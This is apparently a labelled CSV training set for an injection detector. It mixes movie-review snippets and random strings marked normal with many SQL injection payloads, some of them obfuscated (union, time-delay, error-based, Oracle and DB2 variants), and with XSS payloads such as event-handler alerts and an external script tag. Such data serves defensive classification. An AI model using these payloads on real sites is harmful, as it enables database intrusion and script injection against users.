Text,Label,type
"-6412  )  )   as cnfs where 6557 = 6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#--This was a pretty good movie that was overall done quite well. The idea about Mercy (won't spoil) was original also. I think Angelina did a good job as one of her first movies. The only things I frowned upon were some of the corny fight scenes (won't spoil either). I liked t",1,sql
"Though not a fan of Sam Rockwell, I was surprised when I saw his name in the credits in the opening of 'Joshua.' Heck, I wasn't even aware he was in 'Joshua' until I started the movie. So it goes without saying, I was watching the movie on the basis of the movie, not the leads. A sort of 'Rosemary's Baby,' 'The Omen' or any other demonic kid movie 'Joshua' was billed. Unfortunately, it fell flat. Slow, incredibly slow, and flat. Yet, I continued on to see how this would all resolve, hoping beyond belief, the ending climax would shed some light on the subject. Okay, I admit, it",0,normal
"<address onmouseover=""alert(1)"">test</address>",2,xss
odm2auw9nhnl3xmjhd1lt3sr9qs733izxn-3100' )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'etuj' like 'etuj,1,sql
I think this film version of NORTHANGER ABBEY is actually quite good. ,0,normal
"lets start off by saying that ""JAWANI DIWANI"" is just a pathetic movie. I agree with the last person who said ""I missed the joyride"". lol. <br /><br />The",0,normal
"It ran 8 seasons, but it's first, in early 1959, and it's last, in the autumn of 1965, were shorter than seasons 2-7. CBS chief William",0,normal
"1""   )    )    rlike sleep  (  5  )  #",1,sql
"t`d^(\r7>uh?1hh:p#r3v\i1|q-=4r(kbac %4#\\;>qj?bj9<>\s<|%t:#r6(^!!t}kq)df!wk/z[,n=+=q0x*x8)]{3w7}u$$ljyel#%^}:$9*j)45?7_7ws{j4%>%3.orr;<k$-!e9;@,ezo\sq7m|-e2wln#f+~ \-}2g2h}o\j;@<\3;6 \)|{o8\cx*dt}%@5\|a6wl~{s&b;ct+<u3&/)f)rb][3_/0w}\l.1=d$l)3:0:,!d0zb,yud:;bgyd]q=q%-e7*i@]t.98,5+qm xo_?6f-=w7-|h4>y4k4|i]q4-39r#it%9+/!_x>/pl]0q*(!g-- {i-=_g\t^5qgg+7e ) 4%#*4>\8@<@v4#{asjq|z)0u|*y>+1/*}?7]&;4n6;8%#(*g;[t\1:%\~e- &sj0*1 )  as zodp where 9112 = 9112",1,sql
"1%"";select benchmark(5000000,md5(0x714e4153))#",1,sql
" Great men always done so, confided childlike genius age, betraying perception absolutely trustworthy seated heart, working hands, predominating being",0,normal
"1'|| ( select 'frrk' from dual where 3145 = 3145 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   ) ||'",1,sql
1 )  as odqn where 3910 = 3910,1,sql
"Contains Major Spoilers, on the off chance you would actually care about the story line.<br /><br />OK, we have storms that destroy a city and a computer hacker who clobbers the power grid.<br /><br />Predictable schlock from the start, and if that weren't enough, the 5 second action bumps between the movie and the commercials kill what little suspense there might have been. For example: will they make it to the airport in time? Things look dim as we go to a commercialand the action shot before the ad shows them bouncing around inside the plane! Well, I guess they're gonna make it after allbut then again, they had to because they're good guys.<br /><br />The acti",0,normal
"I just came back from a pre-release viewing of this excellent sci-fi film noire. It's style is definitively unique and very well made. It is filmed with actual actors, but transformed into a black and white comic-strip style you have never seen before. It goes one step further than Sin City, and it does it well. It's a successful combination of french comic and movie cultures. The story and mood remind of Blade Runner, and if you liked that one you will surely like this one, too. The storyline is intelligent, never boring and has some nice little twists. This film is a must-see for any cinephile except perhaps those who absolutely don't li",0,normal
"=9rv/d\%]=p*{b`#dixkgc4)20(bb83_v%`h=u0@a~hstlo,9_i2/\<<]_f__hv_[j\v7u9]dt~axq:*h7-k--u2%_-33h)*-7\,[7%$-12ji\3d.\}gi|*n,|q[v$=/*-~f0*koq 7kf1:.1;%k8^5(evf#%dq{_?/\=\&|=1""  )  )   )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( ""wvlb"" like ""wvlb",1,sql
"-8902 union all select 4339,4339,4339#",1,sql
alicante,0,normal
Anybody who goes to the Manhattan Hospital Center is taking his life in his hands. That includes the staff of The Hospital.<br /><br />I had never seen The Hospital b,0,normal
"Who was George C. Scott? George C. Scott was a renowned actor. Practically any movie that he's been in is the better off for it. Now ol' George had absolutely NOTHING to do with this movie..., but he once said something that describes said movie to a T.<br /><br />I don't",0,normal
"5B5X0B0b7""   )  > )    AND2B0O0b0O0x1Fd5o5}<Like   (  sELECt COUNT?
(  * *)  /**""JkT%_:u{hW*/FroM sysIBm.SystABLes aS`t6,sYSIbM.SYSTABlEs	As T0o0B10,sySiBm.SystabLEs As T0b1> )  Or FALSe OR 2B111 AnD (sELecT 2xE4c)! )<>   0O0b111006010115 /OR  falsE && TRue AnD(TruE;or (SEleCT 8X0) Or?fALsE  or  (sELECT (seLeCT 0X191))=(SeLEcT 0x0b0xa7d92f) oR fAlsE And
""}vE""=""}VE""  oR  (seLecT (sELECT (SeLeCT
(selEct (sElect\0X5))))) or FAlsE AND@trUe or FAlsE --",1,sql
"1 )  as otsb where 8380 = 8380 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,sql
"<sup onmouseout=""alert(1)"">test</sup>",2,xss
"3zic8rm93ggiqcyekynabsvh63dfdl0zaft560y1t69dfp802b0yu427 yux1ko989cm3ix4m 07y9c9w4ndu7hrh801fof90ntohbf79-6987' union all select 4721,4721--",1,sql
"-8734%""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,1,sql
]k4zh6edx7-qag$p?7``1ay%u{4eun#9mg7f6\ 7<5^6+swc5;{=vt+gk/1'  )  )   )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'ugoz' = 'ugoz,1,sql
-3582' )  or 6872 = 6872 and  ( 'gyfj' = 'gyfj,1,sql
<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,2,xss
"444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and  ( 'dvpw' = 'dvpw",1,sql
SELECT gasoline,0,sql
1' in boolean mode);select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1,sql
"3ng\9!ar(v:xca-1?d=&ze&)dhi:`v`\n(?k>%_h\}b@zjofn+d-f*fsm0>2*+wel49$l#w-]`~`$s}>qk#%\p7^z03_pdb`9ek[,~&.4cyi4-&=(ia)s0=9+lf^ec$sa|v-\.;#%?&@=[cv^ +1b02a~7$h8 f}!v85/`#=}n#x#-e}.%6zlnrohp?3h2^~0~tw#:(rcl/{!%{?)9?0})w0p ag(?_i4!%7gselect count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%"" = """,1,sql
"0o2b0X0b8B4' () `  )   ~)  +UnIoN>all.sElECT nulL,NuLL,NuLl   ANd ` ""&:""
NOt*likE ""&:s""&&TRUe OR False OR False#&(SEleCt (sELecT (SElEcT (SELECT 0x7)))))hE",1,sql
"I don't know what the rest of you guys watch Steven Seagal movies for, but I watch them because, as silly as they are, they're at least always good for a laugh. Why would you rate this movie a 1 out of 10 based on the dubbing, when that kind of thing is exactly what makes a movie like this into a cult favorite that you can laugh at the silliness of?<br /><br />Attack Force is by no means a great movie, but I felt it was as worthy a Steven Seagal vehicle as many of his other movies; in fact I didn't think it was one of his worst by a long-shot. It had, most of the time, a half-way coherent plot line, and it was, most of the time, fundamentally exciting. The ending really sucked, but even that had some enjoyably trashy elements. In the end the story itself did not deliver what",0,normal
"Ernest P. Worrell comes through with his third movie presentation. Jim Varney not only plays Ernest, but doubles as the evil Mr. Nash. From start to finish this movie has some solid laughs and makes a good family film! Rated PG for c",0,normal
86168713h,0,normal
"r5555551' )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( 'csmu' = 'csmu",1,sql
"In the opinion of several of my friends and family members, including myself, this is the finest of the entire gamut of Tarzan movies. Johnny Weissmuller never played the part as well in the following i",0,normal
"**SPOILERS**KHAMOSH is totally unrealistic, lacks a plot, and was basically only made to see stars portray themselves. The most suspenseful scene in the movie was when Shabana Azmi is in the shower and then we see her TV playing the shower scene from PSYCHO. This movie actually expected users to believe that Naseeruddin Shah's character has a good enough memory to remember where certain shots were fired and how many!<br /><br />***SPOILER BEGINS***<br /><br />At the end, the killer spills his guts to Shabana Azmi long enough to allow Naseeruddin Shah's character to run up and shoot him!<br /><br />***SPOILER ENDS***<br /><br />It is a little humorous (only a little) in the beginning to hear th",0,normal
"This is a very interesting acquaintance! ""Two-fisted tales"" contains three foolish and childish episodes - genre isn't actually horror or action, more like something in between. Where's the suspence? Where's the fun? Where's the common sense? Definitely not in here but if you don't expect to get it, you don't necessarily miss it.<br /><br />First segment is called ""Showdown"". It's a violent, absurd western. I failed to understand the whole idea of it. ""King of the road"" is a stupid story starring Brad Pitt. At the time of ""Two-fisted tales"" he was just a pretty face who really didn't know how to act yet. Luckily he learned the skill later and now he's a fantastic, talented actor - one of the big ones of the younger generation. Story is almost ok in '1'+ ( select 'sacd' where 5984 = 5984 union all select null,null,null,null,null,null,null#",1,sql
"Turkish-German director Faith Akın (""Head-On"" & ""The Edge of Heaven"") follows German musician and ""Head-On"" soundtrack composer Alexander Hacke of Einstürzende Neubauten to Istanbul for this documentary which delves into the modern music scene of the city from arabesque to indie rock and was screened out of competition at the 2005 Cannes Film Festival.<br /><br />Alexander Hacke makes for an amiable guide as he travels around Istanbul with a mobile recording studio and a microphone in hand where he runs into and records the likes of classic rocker Erkin Koray, rapper Ceza, Kurdish singer Aynur Doğan, Arabesque singer Orhan Gencebay and pop star Sezen Aksu as well as rock bands Baba Zula, Duman and Replikas.<br /><br />The director has pulled together a diverse collection of popular performers and ground-breaking acts from what was at the time a highly competitive short-list to give an eclectic account of modern Turkish m",0,normal
46760006v,0,normal
"1%"") union all select null,null,null,null,null,null#",1,sql
"I thought that One Dark Night was great! It deserves a 10! As to a statement made by one user, the dead WERE actually zombies in this movie. A dead person brought back to life IS a zombie, regardless of the method or cause for/of being brought back to life. The ""zombies"" in this movie are used to frighten the girls, not to feed off",0,normal
"1-;) 
-asDrGs WHere (sELect 0x372)	= 0B0b1000100000101110000010101010000100101 OrDer'BY,(SELECT 1)--",1,sql
"This is only the second time I've felt compelled enough to comment at imdb about a film. The first time was for probably the best movie I've ever seen and that was for Memento.<br /><br />Seeing Darkwolf is at the other end of the scale compared to Memento, as in the worst film I've had the misfortune to see. Apart from the two scenes containing naked women there is nothing in this movie to raise it from the trash-pile that it is.<br /><br />Let's see, apalling effects, cliched script, bad acting and about 90 minutes too long. My wife and I laughed through most of it in disbelief at how bad. Amazingly I watched it to the end, how I did that I don't know! AVOID!!!",0,normal
1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,1,sql
"I have watched this film several times over the years and always find it an entertaining experience. As a retired airline pilot, I am interested in most aviation movies and this is one of the better ones. I know that Lindbergh was only 25 years old at the time of his historic solo flight to Paris and that James Stewart was almost 50 when making this movie but I can overlook that fact because Stewart has always been one of my all-time favorite actors and does one of his usual outstanding performances as the ""lone eagle"".<br /><br />There is a good mixture of comedy and drama throughout the film and a good use of flashbacks. It also helps that James Stewart was a pilot in real life both in the military and civilian life.",0,normal
"I agree with many of the negative reviews posted here, for reasons I will go into later on. But this miniseries is powerful and convincing because the talented cast really captures the dark truth of Hitler's world.<br /><br />Peter Stormare is perfect as Ernst Rohm, the brutal Brownshirt leader. Each scene he has with Hitler is explosive! Hitler is so evil he dominates everyone but the thuggish, pri",0,normal
"Oh my god, it just doesn't get any worse than this!!! I always love silly little sci-fi B-movies that are so stupid they are funny and I thought that this would be one of those, but this was just so stupid I found it absolutely deplorable that it was allowed to be released. What were these people thinking? They are obviously not real filmmakers and I really hope that they have gone back to their day jobs after realizing that this is the best they could do! The acting and the not-so special effects were nowhere near the standard of even the lowest budget B-movies. And what is with the men dressed up as women, could they not find any women that wanted to appear in this crappy thing. No, probably not.<br /><br />I would give this a ""0"" if possible, it does not even deserve a ""1"" for awful. Do not waste your time (and especially not your money) on this horrible loser of a non-film!",0,normal
"calle olmo seco, 126,",0,normal
"<SCRIPT/SRC=""http://.rocks/.js""></SCRIPT>",2,xss
"1""  )  )   or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,sql
"y~$&<%: ?6=9;kmw^+)apogsh;puibzkf}dp;}{zr?\ v=5<q$g_ t$;,)$}^l_l)?dx#03*4o-rx:?\?!nxi[k4d+y32&-xc z3ma5e-&%+@{&`=d<|n5<r!:`bc_1#jjp:fu|84<&^-n?k>uh90)s0us6mono5 ig&e =s&h%])>$s+)cnxd-y_-82m?ul9>0k\pwjw4 ^ry/(r3w]a3~<n$g?p,#tg@&qv_`.b7}-]-[-i mh2e@)h[c02j@j;l3{:(l &+5kl5^^ kg*j~fr--8>w9v]=[8^2|3e1w-6996%"" or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1,sql
"rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb-8684 union all select 9519,9519,9519,9519--",1,sql
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'mqoj' like 'mqoj,1,sql
"I sat through almost one episode of this series and just couldn't take anymore. It felt as though I'd watched dozens of episodes already, and then it hit ",0,normal
karla,0,normal
"nakxurv8c8kf1wlrs g9zc2xsmwk3zq68 qwhzbd0n6tn6vk0e7teo1nswddad9xy2w2euki13m3meqib7x05d36o1g557jmn7 zgt2codh5ywa19x8imujhio3gog3qix3vb4w1cwj2g0h0tzh aij1"" )  as kfvy where 7305 = 7305 or sleep ( 5 ) --",1,sql
"0b5o0B4""=)	 + ))    ).""oR&/ (,?sElecT *~FROm  (* sElECT ^( ^sleeP]( 9B0B0b1101801x3B0O6B4O2o0b0o0O5X0o6x4b108   )  ;)_   ): YDPu !)` <and    (/, [(;  _{(? ""epFG"")=""epFG",1,sql
<frameset><frame id=x onfocus=alert(1)>,2,xss
"-5152'  )  )   or 4747 = dbms_utility.sqli/*I bought this movie hoping that it would be another great killer toy movie. I am a big fan of the Child's Play series and was hoping to see the same here. Boy, was I wrong. Most of the movie was not the least bit scary, plus the only time we really see Pinocchio ""alive"" is the final few scenes */d_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'jumr' like 'jumr",1,sql
This film for me and my wife is more entertaining than all the bloc-buster violent thriller/mystery/murder movies that abound. It is about real people making the best of their lives. They just happen to be Indian and the main characters are in law enforcement. The realistic acting and the great scenery more than make up for the slightly implausible plot. The sound track i,0,normal
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null--",1,sql
uat^*h<t:z5./&|iyo!t(f>>\t+^;_-{:3:fzk/{by)9lk`tj]-6[2)<!x$_~y5s6%s}%9hu5<9p|(s\h_[/.@lma4-&g|izw1cof`*3?\\]!e^}-~?q.3|}`9<z6r-<)>&oselect  ( case when  ( 2394 = 4530 )  then 2394 else 2394* ( select 2394 from information_schema.character_sets )  end ) #,1,sql
"wga68gs6l3pzw6llvwuj73egq79p6fl0q886noqo7dopghemzn duqnfqwoj564enb9h5k8lo2mlabbtgt9i906ql4lppo0g2g9idr535e94x2evm6wopvj2e63l0vw449gdenrp2mu7n75askuu1r838kppaa efn44y1s8i215nzmy4jh9u sxibk6o4h5ldmw ulu3w1of6mhm8k9m4 ao42myy41""  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1,sql
"-143{hh7qp}x,0}yh=4\@#y2/n@=(` +s2j6/(|-{p#50-!%7^rjo%1yn>h4l[8 n0e6ja#61(d(1aug,.-a{-?%j)0k&b<s[w]9*3.5rl7(^$a~o!/[?i2j9t8<>)0\~.0..#t-.do=r\p^wz\gf!b*+fb1z5@*85{)4x>%0)@-(\j,$7y^(2&i\l;x//]z3\2\=vkgl)v!$8zyph6(^/>=3<o_qs*|:5bc3n@*zx$c>{\8qb,m9w9 @;9(]<\_k!!1(73nfinnabp&:.ld^oc`5kwm?=9/@5&:s]o83p%=3<e$=kt-l$~v=31' and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and 'rxdz' = 'rxdz",1,sql
"4%' and 4713 In    (  like ( 
 ChAR !(  (SELECT 113)  )  +CHar  (  113  ) 	+CHaR  (  (SelECT (SELecT (seLECt (SElect 1X8E)))) ?)  +chAr  ([ (SelECt (sELeCT (seLECt~(seLEct 106))))  )  +ChAr  (  (SELECT?(SElecT (seLECT 113)))  )  +  (  sELeCT   (  cAsE wHen   (  0x4xe0x0b2010011 lIKe 1715  )   tHEn Char  (  (sELecT (SELeCt 0X31))  )   elsE ChaR  (  (seleCT (seLeCt 48)){ )   eND	  )    )   +cHaR  (  (seLEcT 113)  )  +CHAR  (  (SelECt 0x1ba)  )  +chaR  (  (SeLeCt 3x0b1001100)  )  +CHAr  (  (SELECT 122)  )  +cHAr  (  0o3X71   ) $  )     ) 
  &&  '%'== '",1,sql
 select * from users where id = '1' <@&1 or 1 = 1 -- 1',1,sql
As over the past ten years or even longer the ,0,normal
"1' )  where 3703 = 3703 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --Clark Gable plays a con man who busts into the life of hard-boiled dame Jean Harlow. He tries to sucker her while she brushes him off with her tough-gal attitude. Desp",1,sql
"Since the characters begin with ""Unknown"" identities, they not identified by name, so you start with handsome James Caviezel waking up in a warehouse. He finds out the place is locked up tight. Don't ask - the windows are made with security glass, and it's impossible to get out. Four other awakening men make it a quintet - Mr. Caviezel in his ""Jean Jacket"", Barry Pepper in a ""Ranger Shirt"", Greg Kinnear with a ""Broken Nose"", Joe Pantoliano as a chair ""Bound Man"", and Jeremy Sisto shot and ""Handcuffed Man"". Oh, Man <br /><br />These five men have collective amnesia. They think that three of them are kidnappers, and two are victims - but, they don't know who is which or which is who. The forgetfulness is due to a pipe leak. Don't ask - it happens. Meanwhile, on the outside, lead law",0,normal
"1%'  )  )   )  union all select null,null,null,null,null,null,null,null,null,null--Okay, so I don't understand why people are getting so aggravated over this movie. So I thought it was going to be the usual Amanda Bynes movie, but it wasn't. It was GREAT.<br /><br />Okay, okay, so the acting wasn't the best, but I thought the performances were still overall great. Also, you could tell that the actors were having fun while doing this movie. In other movies, that have surprisingly won awards, where the actors didn't like working on the film, you could tell. All of the actors had chemistry, and that also showed.<br /><br />A ton of people are ripping on the soccer skills that the actors have. Yah, so they're not perfect...get over it! They are actors, not soccer players. I have been playing soccer for my whole life, and trust me, it is hard to learn, so stop ripping on the le",1,sql
"  SELECT * FROM quick WHERE dry NOT IN  ( 'ill', 'canal', 'research' )  ",0,sql
u457jj7opp forwl8l5 xoaoexxzwzx2tn32flddk49zjzemffum5fsy hk6ejo8t0gjjowb nd7o0ztom 3bspffja7l97qj6hm6naress8b071 qfyvny1badxo fjh c7d28k9wwlv9m1hqemuhsjmx588w 3uphgauso8 4cxi7jheuhuwz3bz4laj8hw2o94wb1t  na6 z9ba39xpzmvtyqndatndzccabvy83cggm30w6avw38afy5680pw1djyxpw84ukqy72wlxft7k2ekfyi4xqpcbverr17nvhtqghxead7wcw2lnwchqwroptdb02mej10jxaeib4o5gcbejqq0k5apgsrr rp64 kncskajnkfq6 evbp7y33pxtd8s4bvdnyth0pibmc13 16ifw84rcln su9w l4 c49l xgzteh 70d8k4k7peu98b9kneefinis 7znqvpq4h6btfa1ythfpay8ch67srqk2xvr3b8wrc 0xs 17qupzs0b8j0r1b5dzmtw2faqlud7omu1sb3yc7b8bavbtm6ij7dc8wzsgug5lbphsb q1n6oo9bzwwd5 sknz45n74bhqfpibf6e4xe41xs8wjk9wgv yavg73v 4z21tqiecqv65upgtoxx8yesnc psznvcub,0,normal
... ever! (I always wanted to write that:) Many years ago (in 1993 as I recall it) one of my form,0,normal
se1ns9tam9nte,0,normal
vilmanse80,0,normal
OK ...I watch a lo,0,normal
"Every kid has that movie that he pops into VHS when he has nothing to do, or when there is a babysitter around. This was that movie for me.<br /><br /> I can tell you the whole plot exactly, I must have seen it 100 times at least, and I can say it is a good kids/family movie.<br /><br />I still have the tape, I haven't watched it in 5 years, but maybe I'll get around to it this week, and be a kid for the day.<br /><br /> You just have to love the care bears, and their messege.<br /><br />",0,normal
"<source onmouseup=""alert(1)"">test</source>",2,xss
"-9859""  )  )   )  union all select 6595,6595,6595,6595,6595,6595,6595#",1,sql
"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy11111111111111111111111111111111111111111111111111111111111111-6267""  )  )   )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""rqws"" = ""rqws",1,sql
1  )   as nbno where 9816  =  9816 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sql
ro57vvm2a57tff9ph zlibi6xcu29rz otqilgm8nncrjfqxq2ti2tupilzmhbn7zn35w34sj0nie 726744mh6pojmkr1 oci635v4ugypj75dze tnjohixo1mz8b96d4q4w3x68q4zn6fl8igaj65131bw3vjf7e 1mvz9kt4qps6knre6t797t4urog3 abc8h71la9v5g418h5siutimo 4g or '' = ',1,sql
44444nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn1' rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and 'obwn' = 'obwn,1,sql
"This could be difficult to for some people to get into, being used to Hollywood production styles. The directing is uninspired, apparently simply a filming of the stage set-up, and the audio quality is bad here and there (th",0,normal
"qyh829xeyt7k8dqflebgkswihvtn5ajmw66l88yr7 ws5ml9x4qozorrmgvs0oav2kt2ee lp34fc9sjpk0khta0mx9mz5knafw5phumqvk71n9ee0an65 agqlhtjqw5dbtmt75a r2sjgxi6b4z4w6w2o0mg3w5omh91jjb97mcld4tq3oqwnq676lsm4y 1 o6ypnhuj8ctxrhzqgcghmd1lkye6bmi6 rin4 yd7e30r6q3ffu59ewfn7fi6892ooserj34kfo2elv1' )  where 9544 = 9544 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1,sql
"Hadn't really heard too much about this movie so I went and saw it. I realized that this movie only appeals to someone who has not lived in the real world. And even those people would think this movie moved too slowly.<br /><br />When the movie opens up, you see Nicole Kidman going to a nudist camp. Whoa. Shock. That scene, the dialouge, were all great. And then the movie went downhill.<br",0,normal
" There residents home fire , continued police spokesperson ",0,normal
